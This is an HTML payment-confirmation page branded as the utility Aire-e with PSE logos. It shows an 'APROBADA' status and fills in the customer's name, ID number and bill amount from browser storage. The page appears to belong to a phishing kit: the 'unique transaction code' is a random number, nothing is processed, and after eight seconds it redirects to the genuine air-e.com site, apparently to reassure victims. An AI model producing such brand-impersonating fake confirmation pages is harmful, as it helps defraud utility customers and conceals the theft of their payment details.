<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Aire-e | Estado de la transacción</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:Arial, sans-serif;background:#f4f5f7;color:#333;}

.aire-header{
  width:100%;
  background:#00496b;
  height:110px;
  overflow:hidden;
}

.aire-header-inner{
  width:100%;
  height:100%;
  display:flex;
  align-items:stretch;
  position:relative;
}

.aire-header-left{
  position:relative;
  background:#ffffff;
  display:flex;
  align-items:center;
  padding:0 25px;
  gap:18px;
  min-width:250px;
  z-index:2;
}

.aire-header-left img{
  height:55px;
  display:block;
  object-fit:contain;
}

.separator{height:50px !important;}

.aire-header-left::after{
  content:"";
  position:absolute;
  right:-70px;
  top:0;
  width:140px;
  height:100%;
  background:#ffffff;
  box-shadow:6px 0 12px rgba(0,0,0,0.35);
  transform:skewX(25deg);
  z-index:-1;
}

.aire-header-right{
  flex:1;
  background:#00496b;
  position:relative;
}

.aire-header-right::before{
  content:"";
  position:absolute;
  left:0;
  top:0;
  width:80px;
  height:100%;
  background:linear-gradient(to right, rgba(0,0,0,0.45), transparent);
}

@media (max-width:768px){
  .aire-header{height:100px;}
  .aire-header-left{
    min-width:180px;
    padding:0 15px;
    gap:10px;
  }
  .aire-header-left img{height:40px;}
  .separator{height:38px!important;}
  .aire-header-left::after{
    right:-50px;
    width:100px;
    transform:skewX(22deg);
  }
  .aire-header-right::before{width:50px;}
}

@media (max-width:480px){
  .aire-header{height:90px;}
  .aire-header-left{
    min-width:150px;
    padding:0 10px;
    gap:8px;
  }
  .aire-header-left img{height:32px;}
  .separator{height:30px!important;}
  .aire-header-left::after{
    right:-35px;
    width:80px;
  }
}

.wrapper{
  padding:15px;
}

.title{
  font-size:22px;
  font-weight:bold;
  color:#003d6b;
}

.line{
  height:3px;
  width:100%;
  background:#00a8e0;
  margin:6px 0 15px 0;
}

.msg-success{
  background:#e6f9e6;
  border:1px solid #9dd89d;
  padding:10px 12px;
  border-radius:6px;
  color:#126312;
  font-size:12px;
  display:flex;
  align-items:center;
  gap:10px;
  margin-bottom:20px;
}

.msg-success img{
  width:18px;
  height:18px;
}

.card{
  background:#fff;
  border-radius:6px;
  box-shadow:0 2px 5px rgba(0,0,0,0.1);
  margin-bottom:18px;
}

.card-header{
  background:#003d6b;
  color:white;
  padding:10px;
  display:flex;
  align-items:center;
  gap:8px;
  border-radius:6px 6px 0 0;
  font-size:15px;
  font-weight:bold;
}

.card-header img{
  width:14px;
  height:14px;
}

.card table{
  width:100%;
  border-collapse:collapse;
  font-size:14px;
}

.card td{
  padding:8px 12px;
  border:1px solid #e5e5e5;
}

.card td:first-child{
  font-weight:bold;
  width:45%;
}

.logo-pse{
  width:70px;
  display:block;
  margin:15px auto;
}

.footer-tx{
    font-size:13px;
    color:#555;
    margin-top:25px;
    padding:0 12px 25px 12px;
    line-height:1.4;
}

.footer-tx a{
    color:#0077cc;
    font-weight:bold;
    text-decoration:none;
}

.footer-tx a:hover{
    text-decoration:underline;
}

.footer-tx .note{
    font-weight:bold;
    margin-top:8px;
    display:block;
}
</style>

</head>
<body>

<header class="aire-header">
  <div class="aire-header-inner">
    <div class="aire-header-left">
      <img src="../../../../informacion/logo-aire.png" alt="Aire-e">
      <img src="../../../../informacion/linea.png" alt="Separador" class="separator">
      <img src="../../../../informacion/facture-pay.png" alt="Facture Pay">
    </div>
    <div class="aire-header-right"></div>
  </div>
</header>
<div class="wrapper">

    <div class="title">Estado de la transacción</div>
    <div class="line"></div>

    <div class="msg-success">
        <img src="../../../../check.png" alt="ok">
        <span>Su transacción ha finalizado en estado <strong>APROBADA</strong>.</span>
    </div>

    <div class="card">
        <div class="card-header"><img src="../../../../i.png"> Información del pago</div>
        <table>
            <tr><td>Fecha</td><td id="fecha"></td></tr>
            <tr><td>Referencia del pago</td><td id="ref"></td></tr>
            <tr><td>Descripción</td><td id="desc"></td></tr>
            <tr><td>Total pagado</td><td id="total"></td></tr>
        </table>
    </div>

    <div class="card">
        <div class="card-header"><img src="../../../../i2.png"> Información de la transacción</div>
        <table>
            <tr><td>Origen del pago</td><td>PSE</td></tr>
            <tr><td>IP</td><td id="ip"></td></tr>
            <tr><td>Banco</td><td id="banco"></td></tr>
            <tr><td>Código único</td><td id="cod"></td></tr>
        </table>
        <img style="width:30px;" src="../../../../informacion/public/imagenes/LogoPSE.png" class="logo-pse">
    </div>

    <div class="card">
        <div class="card-header"><img src="../../../../i3.png"> Tus datos</div>
        <table>
            <tr><td>Nombre</td><td id="nombre"></td></tr>
            <tr><td>Identificación</td><td id="ced"></td></tr>
        </table>
    </div>

</div>


<div class="footer-tx">
    Al presionar el botón Iniciar Pago acepta nuestra 
    <a href="#">Política de Protección de Datos y Privacidad.</a>

    <span class="note">
        Nota: El sistema se conectará con la página transaccional del banco seleccionado.
    </span>
</div>


<script>
let fx = JSON.parse(localStorage.getItem("fractu")) || {};
let banco = localStorage.getItem("nom") || "";
let total = Number(localStorage.getItem("total_pagar")) || 0;

document.getElementById("fecha").textContent =
    new Date().toLocaleString("es-CO", { hour12:false });

document.getElementById("ref").textContent = fx.nic || "";

document.getElementById("desc").textContent =
    "Pago factura " + (fx.numero_documento || "");

document.getElementById("total").textContent =
    "$" + total.toLocaleString("es-CO");

document.getElementById("banco").textContent = banco.toUpperCase();

document.getElementById("nombre").textContent =
    ((fx.nombres || "") + " " + (fx.apellidos || "")).trim();

document.getElementById("ced").textContent = fx.identificacion || "";

document.getElementById("cod").textContent =
    Math.floor(1000000000 + Math.random() * 9000000000);

fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(data => document.getElementById("ip").textContent = data.ip)
    .catch(() => document.getElementById("ip").textContent = "No disponible");

setTimeout(() => {
    window.location.href = "https://www.air-e.com/index.html"; 
}, 8000);
</script>
</body>
</html>